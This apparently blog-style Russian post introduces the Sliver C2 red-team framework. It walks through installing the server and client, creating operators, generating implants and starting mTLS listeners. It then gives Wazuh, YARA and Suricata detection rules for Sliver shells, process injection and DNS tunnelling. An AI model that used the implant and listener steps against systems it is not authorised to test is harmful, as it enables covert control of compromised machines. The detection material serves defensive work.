---
title: "Sliver C2: изучение, демонстрация работы, детект"
date: 2025-10-30
draft: false
description: "Sliver C2: изучение, демонстрация работы, детект"
image: "/cdn/blog-cdn/large_Snimok_ekrana_ot_2025_10_27_22_22_16_ad7492972f.png"
---

**Sliver C2** - это фреймворк Red Team с открытым исходным кодом, [разработанный](https://bishopfox.com/blog/sliver) компанией BishopFox, занимающейся кибербезопасностью, и представляет собой кроссплатформенную среду постэксплуатации на основе .
Он используется для выполнения второго этапа выполнения цепочки атак на внутреннюю сеть (когда компьютер жертвы уже был скомпрометирован доступными способами) и является альтернативой такого коммерческого инструмента как **CobaltStrike**, как утверждают сами производители.

### Архитектура Sliver C2

**Архитектура Sliver C2 состоит из трёх частей:**

- **Сервер Sliver C2**. Является частью исполняемого файла sliver-server, управляет внутренней базой данных, а также запускает и останавливает сетевые прослушиватели. Основным интерфейсом взаимодействия с сервером является интерфейс gRPC, через него реализуются все функции.

- **Клиентская консоль**. Это основной пользовательский интерфейс для взаимодействия с сервером Sliver C2.

- **Импланты**.  Это вредоносный код, нагрузка, (exe, ps1 и т. д.), запускаемая в целевой системе.

### Установка Sliver C2

Установить данный инструмент можно по [ссылке](https://github.com/BishopFox/sliver).
Посмотреть и скачать нужный для вас релиз можно по [ссылке](https://github.com/BishopFox/sliver/releases).
Официально рекомендуется развертывать Сервер на Linux (Windows не рекомендуется). Просто найдите соответствующую версию и загрузите версии Сервера и Клиента.
У Sliver есть две дополнительные функции, требующие внешних зависимостей: MinGW и Metasploit.

1. Чтобы включить полезные нагрузки DLL (на серверах Linux) вам необходимо установить MinGW: `sudo apt install mingw-w64`

2. Для включения некоторых функций интеграции с MSF необходимо установить также Metasploit: `wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run` После этого мы можем спокойно запустить наш сервер командой: `./sliver-server_linux`
![sliver1.jpeg](/cdn/blog-cdn/large_sliver_9881593e56.jpeg)

Создание оператора

`new-operator --name test --lhost 192.168.122.31`

для включения многопользовательского режима

`multiplayer`

![sliver2.jpeg](/cdn/blog-cdn/sliver2_fa8d49b247.jpeg)

**Установка клиента:**
Теперь, нам нужно установить `sliver_client`, для того, чтобы загрузиться с нашего клиента.
Во время его запуска, нам нужно будет импортировать конфигурационный файл, который мы только что создали:
`./sliver-client_linux import /home/user/test_192.168.122.31.cfg
После этого запускаем команду:
`./sliver-client_linux`
И видим, что мы подключились к сессии:

![sliver3.jpeg](/cdn/blog-cdn/sliver3_ef6d1a3e5e.jpeg)

#### Создание импланта

Генерация импланта происходит на сервере C2 с помощью команды `generate`. Подключитесь к нему и пропишите `help generate`, чтобы прочитать обширную справочную страницу и узнать обо всех флагах. Наиболее важные из них следующие:

- `--mtls 192.168.1.142`: указывает, что имплант должен подключаться к серверу Sliver с использованием соединения TLS с взаимной проверкой подлинности. В альтернативу TLS также есть:

  - `--wg` WireGuard;

  - `--http`соединения HTTP(S);

  - `--dns` на основе DNS.

- `--os linux`: указывает, что мы хотим запустить имплант в linux (это значение по умолчанию, поэтому мы можем опустить этот параметр). Также поддерживаются MacOS и Windows.

- `--arch amd64`: указывает, что нам нужен 64-битный имплант (также значение по умолчанию, можно опустить). Кроме того есть `--arch 386` для 32-битного.

- `--format elf`: указывает, что нам нужен исполняемый файл (опять же по умолчанию). Другие варианты:

  - `--format shared` для динамических библиотек;

  - `--format service` двоичного файла службы Windows (можно использовать с командой `psexec`) и `shellcode` (только для Windows).

- `--save /home/user/:`   указывает каталог для сохранения двоичного файла.

Вот пример генерации двоичного файла, который сгенерировал Sliver (название файла выбирается случайно) `INDUSTIAL_PICTURE`:

Теперь запустите прослушиватель mTLS на сервере C2 с помощью команды `mtls`(по умолчанию прослушиватель запускается на порту 8888). Посмотреть прослушиватели можно с помощью команды `jobs`:

После этого ваш имплант должен работать. На сервере C2 в Sliver вы должны увидеть такую ​​строку, которая указывает на то, что сеанс с имплантом установлен:

![sliver4.jpeg](/cdn/blog-cdn/sliver4_f96a09bd05.jpeg)

![sliver5.jpeg](/cdn/blog-cdn/large_sliver5_d91510c8a6.jpeg)

Пример info о системе

![sliver6.jpeg](/cdn/blog-cdn/sliver6_0de4289a41.jpeg)

## Детектируем Sliver c2

### wazuh

Запуск shel sliver c2

```xml
<group name="sliver,">
  <rule id="107000" level="12">
    <if_sid>61603</if_sid>
    <field name="win.eventdata.parentImage" type="pcre2">.exe</field>
    <field name="win.eventdata.image" type="pcre2">powershell.exe</field>
    <field name="win.eventdata.commandLine" type="pcre2"> -NoExit -Command \[Console\]::OutputEncoding=\[Text.UTF8Encoding]::UTF8</field>
    <description>Possible Sliver C2 activity: shell executed: $(win.eventdata.commandLine).</description>
    <mitre>
      <id>T1086</id>
    </mitre>
  </rule>
```

Детектирующее правило на инжект в процесс

```xml
  <rule id="107001" level="9">
    <if_sid>61610</if_sid>
    <field name="win.eventdata.sourceImage" type="pcre2">.exe</field>
    <field name="win.eventdata.targetImage" type="pcre2">C:\\\\Program\ Files\\\\D*[A-Za-z0-9_.]*\\\\[A-Za-z0-9_.]*\\\\[A-Za-z0-9_.]*\\\\[A-Za-z0-9_.]*.exe$</field>
    <description>Suspicious process injection activity detected from $(win.eventdata.sourceImage) on $(win.eventdata.targetImage).</description>
    <mitre>
      <id>T1055</id>
    </mitre>
  </rule>
</group>
```

### YARA

```plain
rule sliver_client : c2 implant
{
    meta:
        description = "Sliver C2 Implant"
        author = "Wazuh team"
        url = "https://github.com/BishopFox/sliver"

    strings:
        $s1 = "sliverpb"
        $s2 = "/sliver/"
        $s3 = "github.com/bishopfox/sliver/"
        $p1 = {66 81 ?? 77 67}
        $p2 = { 81 ?? 68 74 74 70 [2-32] 80 ?? 04 73 }
        $p3 = { 66 81 ?? 64 6E [2-20] 80 ?? 02 73 }
        $p4 = {  81 ?? 6D 74 6C 73  }

    condition:
        2 of ($p*) or any of ($s1,$s2,$s3) and filesize < 50MB
}
```

### Suricata

Возможное dns тунелирование, длинная метка поддомена.

```plain
alert dns any any -> any any (msg:"SLIVER-DETECT Suspicious DNS - long subdomain label (possible DNS tunneling)"; \
    dns.query; pcre:"/([A-Za-z0-9\-]{50,})\./"; \
    classtype:trojan-activity; sid:1000003; rev:1; \
    metadata:attack_target Client_Endpoint, confidence medium, policy balanced;)
```

Большой TXT ответ от dns сервера

```plain
alert dns any any -> any any (msg:"SLIVER-DETECT Suspicious DNS TXT response - large TXT (possible exfiltration/C2)"; \
    dns.txt; byte_test:1,>,100,0; \
    classtype:trojan-activity; sid:1000004; rev:1; \
    metadata:attack_target Client_Endpoint, confidence low, policy balanced;)
```

DNS: частые запросы к разным поддоменам одного домена за короткое время (фингер для туннелинга)

```plain
alert dns any any -> any any (msg:"SLIVER-DETECT DNS beaconing - many subdomain queries to single domain"; \
    dns.query; threshold:type both, track by_src, count 20, seconds 120; \
    classtype:trojan-activity; sid:1000007; rev:1; \
    metadata:attack_target Client_Endpoint, confidence low, policy balanced;)
```

Подводя итог, можно сказать, что Sliver обладает рядом значительных преимуществ, таких как повышенная скрытность и кроссплатформенность, что упрощает его использование. Хотя размер генерируемых оболочек может быть недостатком, его функциональность, превосходящая CobaltStrike, и простота установки делают его конкурентоспособным инструментом.

